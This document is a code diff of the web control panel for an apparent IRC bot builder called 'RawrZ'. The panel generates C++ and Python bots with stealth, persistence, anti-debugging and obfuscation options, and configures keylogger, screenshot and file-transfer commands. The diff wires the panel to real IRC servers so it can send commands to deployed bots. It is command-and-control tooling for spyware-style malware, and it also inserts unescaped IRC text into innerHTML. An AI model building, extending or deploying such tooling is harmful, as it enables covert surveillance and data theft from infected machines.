@@ -693,20 +693,24 @@
             output.textContent = 'Creating IRC bot...';
             
             try {
-                const result = await apiCall('/irc-bot-create', 'POST', {
-                    type: type,
+                const result = await apiCall('/api/irc-bot-generator/generate', 'POST', {
+                    name: nick,
                     server: server,
                     port: parseInt(port),
                     channel: channel,
                     nick: nick,
-                    options: {
-                        ssl: ssl,
-                        stealth: stealth,
-                        persistence: persistence,
-                        antiDebug: antiDebug,
-                        encryption: encryption,
-                        obfuscate: obfuscate
-                    }
+                    username: nick,
+                    realname: 'RawrZ IRC Bot',
+                    password: '',
+                    ssl: ssl,
+                    features: [
+                        ...(stealth ? ['stealth'] : []),
+                        ...(persistence ? ['persistence'] : []),
+                        ...(antiDebug ? ['antiDebug'] : []),
+                        ...(encryption ? ['encryption'] : []),
+                        ...(obfuscate ? ['obfuscation'] : [])
+                    ],
+                    extensions: ['cpp', 'python']
                 });
                 
                 if (result.status === 200) {
@@ -738,23 +742,26 @@
             output.textContent = 'Applying configuration...';
             
             try {
-                const result = await apiCall('/irc-bot-configure', 'POST', {
-                    prefix: prefix,
-                    adminUsers: adminUsers.split(',').map(u => u.trim()),
-                    autoChannels: autoChannels.split(',').map(c => c.trim()),
-                    commands: {
-                        encrypt: encrypt,
-                        decrypt: decrypt,
-                        keylogger: keylogger,
-                        screenshot: screenshot,
-                        fileTransfer: fileTransfer,
-                        systemInfo: systemInfo
-                    },
-                    responses: {
-                        private: private,
-                        delay: delay,
-                        encrypt: respEncrypt,
-                        obfuscate: obfuscate
+                const result = await apiCall('/api/irc-bot-generator/configure', 'POST', {
+                    botId: 'current-bot',
+                    config: {
+                        prefix: prefix,
+                        adminUsers: adminUsers.split(',').map(u => u.trim()),
+                        autoChannels: autoChannels.split(',').map(c => c.trim()),
+                        commands: {
+                            encrypt: encrypt,
+                            decrypt: decrypt,
+                            keylogger: keylogger,
+                            screenshot: screenshot,
+                            fileTransfer: fileTransfer,
+                            systemInfo: systemInfo
+                        },
+                        responses: {
+                            private: private,
+                            delay: delay,
+                            encrypt: respEncrypt,
+                            obfuscate: obfuscate
+                        }
                     }
                 });
                 
@@ -795,9 +802,9 @@
             output.textContent = 'Applying encryption configuration...';
             
             try {
-                const result = await apiCall('/irc-bot-encrypt', 'POST', {
+                const result = await apiCall('/api/irc-bot-generator/encrypt', 'POST', {
+                    botId: 'current-bot',
                     algorithm: algorithm,
-                    key: key,
                     keyExchange: keyExchange,
                     options: {
                         messages: messages,
@@ -806,8 +813,7 @@
                         files: files,
                         metadata: metadata,
                         obfuscate: obfuscate
-                    },
-                    persistence: persistenceOptions
+                    }
                 });
                 
                 if (result.status === 200) {
@@ -831,7 +837,7 @@
             }
         }
         
-        function sendChatMessage() {
+        async function sendChatMessage() {
             const input = document.getElementById('chat-input');
             const message = input.value.trim();
             
@@ -840,6 +846,7 @@
             const chatArea = document.getElementById('chat-area');
             const timestamp = new Date().toLocaleTimeString();
             
+            // Display user message
             const messageDiv = document.createElement('div');
             messageDiv.className = 'chat-message';
             messageDiv.innerHTML = `
@@ -853,40 +860,262 @@
             
             input.value = '';
             
-            // Simulate bot response
-            setTimeout(() => {
-                const responseDiv = document.createElement('div');
-                responseDiv.className = 'chat-message';
-                responseDiv.innerHTML = `
-                    <span class="chat-timestamp">[${new Date().toLocaleTimeString()}]</span>
-                    <span class="chat-user">EncryptBot:</span>
-                    <span class="chat-text">Command received: ${message}</span>
-                `;
+            // Check if it's an IRC command
+            if (message.startsWith('/')) {
+                // Handle IRC command
+                const command = message.substring(1);
+                const [cmd, ...params] = command.split(' ');
                 
-                chatArea.appendChild(responseDiv);
-                chatArea.scrollTop = chatArea.scrollHeight;
-            }, 1000);
+                try {
+                    if (currentIrcId && ircWebSocket && ircWebSocket.readyState === WebSocket.OPEN) {
+                        // Send command via WebSocket
+                        ircWebSocket.send(JSON.stringify({
+                            type: 'irc_command',
+                            data: {
+                                ircId: currentIrcId,
+                                command: cmd,
+                                params: params,
+                                timestamp: new Date().toISOString()
+                            }
+                        }));
+                        
+                        // Also send via API
+                        await apiCall('/api/irc/send-command', 'POST', {
+                            ircId: currentIrcId,
+                            command: cmd,
+                            params: params
+                        });
+                    } else {
+                        // Send via API only
+                        await apiCall('/api/irc/send-command', 'POST', {
+                            ircId: currentIrcId || 'default',
+                            command: cmd,
+                            params: params
+                        });
+                    }
+                    
+                    // Show command sent confirmation
+                    const responseDiv = document.createElement('div');
+                    responseDiv.className = 'chat-message';
+                    responseDiv.innerHTML = `
+                        <span class="chat-timestamp">[${new Date().toLocaleTimeString()}]</span>
+                        <span class="chat-user">System:</span>
+                        <span class="chat-text">Command sent: /${cmd}</span>
+                    `;
+                    chatArea.appendChild(responseDiv);
+                    chatArea.scrollTop = chatArea.scrollHeight;
+                } catch (error) {
+                    const errorDiv = document.createElement('div');
+                    errorDiv.className = 'chat-message';
+                    errorDiv.innerHTML = `
+                        <span class="chat-timestamp">[${new Date().toLocaleTimeString()}]</span>
+                        <span class="chat-user">System:</span>
+                        <span class="chat-text">Error sending command: ${error.message}</span>
+                    `;
+                    chatArea.appendChild(errorDiv);
+                    chatArea.scrollTop = chatArea.scrollHeight;
+                }
+            } else {
+                // Handle regular message
+                try {
+                    if (currentIrcId) {
+                        await apiCall('/api/irc/send-message', 'POST', {
+                            ircId: currentIrcId,
+                            message: message,
+                            channel: document.getElementById('irc-channel').value || '#test'
+                        });
+                    }
+                    
+                    // Show message sent confirmation
+                    const responseDiv = document.createElement('div');
+                    responseDiv.className = 'chat-message';
+                    responseDiv.innerHTML = `
+                        <span class="chat-timestamp">[${new Date().toLocaleTimeString()}]</span>
+                        <span class="chat-user">System:</span>
+                        <span class="chat-text">Message sent to IRC</span>
+                    `;
+                    chatArea.appendChild(responseDiv);
+                    chatArea.scrollTop = chatArea.scrollHeight;
+                } catch (error) {
+                    const errorDiv = document.createElement('div');
+                    errorDiv.className = 'chat-message';
+                    errorDiv.innerHTML = `
+                        <span class="chat-timestamp">[${new Date().toLocaleTimeString()}]</span>
+                        <span class="chat-user">System:</span>
+                        <span class="chat-text">Error sending message: ${error.message}</span>
+                    `;
+                    chatArea.appendChild(errorDiv);
+                    chatArea.scrollTop = chatArea.scrollHeight;
+                }
+            }
         }
         
-        function connectBot() {
+        let ircWebSocket = null;
+        let currentIrcId = null;
+        
+        async function connectBot() {
             const chatArea = document.getElementById('chat-area');
             const timestamp = new Date().toLocaleTimeString();
+            
+            // Get IRC configuration from form
+            const server = document.getElementById('irc-server').value || 'irc.rizon.net';
+            const port = parseInt(document.getElementById('irc-port').value) || 6667;
+            const channel = document.getElementById('irc-channel').value || '#test';
+            const nick = document.getElementById('bot-nick').value || 'RawrZBot';
+            const ssl = document.getElementById('bot-ssl').checked;
+            
+            if (!server || !channel || !nick) {
+                alert('Please enter server, channel, and nickname.');
+                return;
+            }
             
             const messageDiv = document.createElement('div');
             messageDiv.className = 'chat-message';
             messageDiv.innerHTML = `
                 <span class="chat-timestamp">[${timestamp}]</span>
                 <span class="chat-user">System:</span>
-                <span class="chat-text">Connecting to IRC server...</span>
+                <span class="chat-text">Connecting to IRC server ${server}:${port}...</span>
             `;
-            
             chatArea.appendChild(messageDiv);
             chatArea.scrollTop = chatArea.scrollHeight;
+            
+            try {
+                // Connect to IRC via API
+                const result = await apiCall('/api/irc/connect', 'POST', {
+                    server: server,
+                    port: port,
+                    channel: channel,
+                    nick: nick,
+                    username: nick,
+                    realname: 'RawrZ IRC Bot',
+                    password: '',
+                    ssl: ssl
+                });
+                
+                if (result.status === 200) {
+                    currentIrcId = result.data.ircId;
+                    
+                    // Connect to WebSocket for real-time communication
+                    const wsUrl = `ws://localhost:8080`;
+                    ircWebSocket = new WebSocket(wsUrl);
+                    
+                    ircWebSocket.onopen = function() {
+                        const timestamp = new Date().toLocaleTimeString();
+                        const messageDiv = document.createElement('div');
+                        messageDiv.className = 'chat-message';
+                        messageDiv.innerHTML = `
+                            <span class="chat-timestamp">[${timestamp}]</span>
+                            <span class="chat-user">System:</span>
+                            <span class="chat-text">WebSocket connected. IRC connection established!</span>
+                        `;
+                        chatArea.appendChild(messageDiv);
+                        chatArea.scrollTop = chatArea.scrollHeight;
+                        
+                        // Send IRC connection message
+                        ircWebSocket.send(JSON.stringify({
+                            type: 'irc_connect',
+                            data: {
+                                ircId: currentIrcId,
+                                server: server,
+                                port: port,
+                                channel: channel,
+                                nick: nick
+                            }
+                        }));
+                    };
+                    
+                    ircWebSocket.onmessage = function(event) {
+                        const message = JSON.parse(event.data);
+                        const timestamp = new Date().toLocaleTimeString();
+                        
+                        if (message.type === 'irc_message') {
+                            const messageDiv = document.createElement('div');
+                            messageDiv.className = 'chat-message';
+                            messageDiv.innerHTML = `
+                                <span class="chat-timestamp">[${timestamp}]</span>
+                                <span class="chat-user">${message.data.sender || 'IRC'}:</span>
+                                <span class="chat-text">${message.data.message}</span>
+                            `;
+                            chatArea.appendChild(messageDiv);
+                            chatArea.scrollTop = chatArea.scrollHeight;
+                        } else if (message.type === 'irc_connect_response') {
+                            const messageDiv = document.createElement('div');
+                            messageDiv.className = 'chat-message';
+                            messageDiv.innerHTML = `
+                                <span class="chat-timestamp">[${timestamp}]</span>
+                                <span class="chat-user">System:</span>
+                                <span class="chat-text">IRC connection status: ${message.status}</span>
+                            `;
+                            chatArea.appendChild(messageDiv);
+                            chatArea.scrollTop = chatArea.scrollHeight;
+                        }
+                    };
+                    
+                    ircWebSocket.onclose = function() {
+                        const timestamp = new Date().toLocaleTimeString();
+                        const messageDiv = document.createElement('div');
+                        messageDiv.className = 'chat-message';
+                        messageDiv.innerHTML = `
+                            <span class="chat-timestamp">[${timestamp}]</span>
+                            <span class="chat-user">System:</span>
+                            <span class="chat-text">WebSocket connection closed</span>
+                        `;
+                        chatArea.appendChild(messageDiv);
+                        chatArea.scrollTop = chatArea.scrollHeight;
+                    };
+                    
+                    ircWebSocket.onerror = function(error) {
+                        const timestamp = new Date().toLocaleTimeString();
+                        const messageDiv = document.createElement('div');
+                        messageDiv.className = 'chat-message';
+                        messageDiv.innerHTML = `
+                            <span class="chat-timestamp">[${timestamp}]</span>
+                            <span class="chat-user">System:</span>
+                            <span class="chat-text">WebSocket error: ${error.message || 'Connection failed'}</span>
+                        `;
+                        chatArea.appendChild(messageDiv);
+                        chatArea.scrollTop = chatArea.scrollHeight;
+                    };
+                } else {
+                    const messageDiv = document.createElement('div');
+                    messageDiv.className = 'chat-message';
+                    messageDiv.innerHTML = `
+                        <span class="chat-timestamp">[${new Date().toLocaleTimeString()}]</span>
+                        <span class="chat-user">System:</span>
+                        <span class="chat-text">Failed to connect: ${result.data.error || 'Unknown error'}</span>
+                    `;
+                    chatArea.appendChild(messageDiv);
+                    chatArea.scrollTop = chatArea.scrollHeight;
+                }
+            } catch (error) {
+                const messageDiv = document.createElement('div');
+                messageDiv.className = 'chat-message';
+                messageDiv.innerHTML = `
+                    <span class="chat-timestamp">[${new Date().toLocaleTimeString()}]</span>
+                    <span class="chat-user">System:</span>
+                    <span class="chat-text">Connection error: ${error.message}</span>
+                `;
+                chatArea.appendChild(messageDiv);
+                chatArea.scrollTop = chatArea.scrollHeight;
+            }
         }
         
-        function disconnectBot() {
+        async function disconnectBot() {
             const chatArea = document.getElementById('chat-area');
             const timestamp = new Date().toLocaleTimeString();
+            
+            if (ircWebSocket && ircWebSocket.readyState === WebSocket.OPEN) {
+                ircWebSocket.close();
+            }
+            
+            if (currentIrcId) {
+                try {
+                    await apiCall('/api/irc/disconnect', 'POST', { ircId: currentIrcId });
+                } catch (error) {
+                    console.error('Error disconnecting IRC:', error);
+                }
+                currentIrcId = null;
+            }
             
             const messageDiv = document.createElement('div');
             messageDiv.className = 'chat-message';
